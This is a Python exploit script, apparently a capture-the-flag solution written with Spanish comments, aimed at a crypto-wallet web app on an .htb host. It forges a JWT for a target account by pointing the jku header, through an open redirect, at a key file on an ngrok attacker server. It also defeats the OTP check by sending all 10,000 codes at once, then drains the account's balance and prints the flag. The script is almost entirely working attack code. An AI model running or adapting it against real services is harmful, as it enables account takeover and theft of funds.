import requests
import jwt
from datetime import datetime, timedelta
import json
import base64
from jwcrypto import jwk
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import string
import random
import re

attacker_server = "0cb1-186-121-229-225.ngrok-free.app"
victim_server = "192.168.86.46:1337"

def generate_username(length=10):
    # Definir los caracteres posibles (alfanuméricos)
    characters = string.ascii_letters + string.digits
    # Generar un nombre de usuario aleatorio con los caracteres
    username = ''.join(random.choice(characters) for _ in range(length))
    return username

def extract_available_amount(text):
    # Usar una expresión regular para buscar "Available: <valor>"
    match = re.search(r'Available:\s*(\d+)', text)
    if match:
        return match.group(1)
    return None

def generate_jwk(kid):
    # Generar una clave privada RSA
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
    )

    # Serializar la clave privada en formato PEM
    pem_private_key = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption()
    )

    # Convertir la clave privada a JWK
    private_jwk = jwk.JWK.from_pem(pem_private_key)

    # Asignar el KID proporcionado al JWK
    private_jwk["kid"] = kid

    # Devolver el JWK como un diccionario
    return json.loads(private_jwk.export())

def get_kid(jwt_token):
    # Dividir el JWT en sus tres partes: header, payload, signature
  header_b64 = jwt_token.split('.')[0]

  # Decodificar el header (Base64 URL-safe)
  header_bytes = base64.urlsafe_b64decode(header_b64 + "==")  # Aseguramos padding correcto
  header_json = header_bytes.decode('utf-8')

  # Convertir a un diccionario
  header_dict = json.loads(header_json)

  # Obtener el 'kid'
  kid = header_dict.get("kid")

  return kid

def generate_jwks_file(jwk_dict, filename="jwks.json"):

    tmp_jwk_dict = jwk_dict
    tmp_jwk_dict["alg"] = "RS256"
    tmp_jwk_dict["use"] = "sig"

    # Crear el diccionario que contendrá la lista de claves 'keys'
    jwks = {
        "keys": [tmp_jwk_dict]
    }
    
    # Guardar el jwks en un archivo JSON
    with open(filename, 'w') as f:
        json.dump(jwks, f, indent=4)

def create_account(email, password):
    data = {
        "email": email,
        "password": password
    }

    r = requests.post(f"http://{victim_server}/api/auth/register", json=data)

    return json.loads(r.text)["token"]

def add_friend_request(jwt, target):
    
    data = {
        "to": target
    }

    headers = {
        "Authorization": "Bearer " + jwt
    }

    requests.post(f"http://{victim_server}/api/users/friend-request", json=data, headers=headers)

def accept_friend_request(jwt, user_origin):
  data = {
      "from": user_origin
  }

  headers = {
      "Authorization": "Bearer " + jwt
  }

  r = requests.post(f"http://{victim_server}/api/users/accept-friend", json=data, headers=headers)

  print(r.text)

def transaction(email, mount, jwt):
  data_transaction = {
      "to": email,
      "coin": "CLCR",
      "amount": mount,
      "otp":[
      ]
  }
  # Bypass rate limit
  for i in range(10000):
      data_transaction["otp"].append(f"{i:04}")

  headers_request = {
      "Authorization": "Bearer " + jwt
  }

  msg = requests.post(f"http://{victim_server}/api/crypto/transaction", headers=headers_request, json=data_transaction).text
  
  if extract_available_amount(msg) != None:
    data_transaction["amount"] = extract_available_amount(msg)  
    requests.post(f"http://{victim_server}/api/crypto/transaction", headers=headers_request, json=data_transaction)   

def get_flag(jwt):
  headers_request = {
    "Authorization": "Bearer " + jwt
  }
  print(json.loads(requests.get(f"http://{victim_server}/api/dashboard", headers=headers_request).text)["flag"])

email = generate_username() + "@gmail.com"
password = "password123"

print(f"Tus creds: {email}:{password}")

# Creamos el usuario cualquiera
jwt_new_user = create_account(email, password)

# Enviamos la solicitud de amistad al usuario target

add_friend_request(jwt_new_user, "financial-controller@frontier-board.htb")

kid = get_kid(jwt_new_user)

jwk = generate_jwk(kid)

private_key = jwt.algorithms.RSAAlgorithm.from_jwk(jwk)

payload = {
  "email": "financial-controller@frontier-board.htb",
  "iat": datetime.utcnow()
}

headers = {
  "alg": "RS256",
  "typ": "JWT",
  "kid": str(jwk["kid"]),
  # Bypass ssrf from open redirect
  "jku": f"http://127.0.0.1:1337/api/analytics/redirect?ref=http://{attacker_server}/jwks.json&url=http://{attacker_server}/jwks.json"
}

token_target_user = jwt.encode(payload, private_key, algorithm="RS256", headers=headers)
# Esto para el jwks.json public a partir de nuestro jwk

generate_jwks_file(jwk)

# Una vez tengamos el token del usuario target tendremos que aceptar la solicitud del usuario nuestro
print("El jwt del target: " + token_target_user)
accept_friend_request(token_target_user, email)

transaction(email, 9999999999, token_target_user)
transaction(email, 9999999999, token_target_user)
transaction(email, 9999999999, token_target_user)
transaction(email, 9999999999, token_target_user)

get_flag(token_target_user)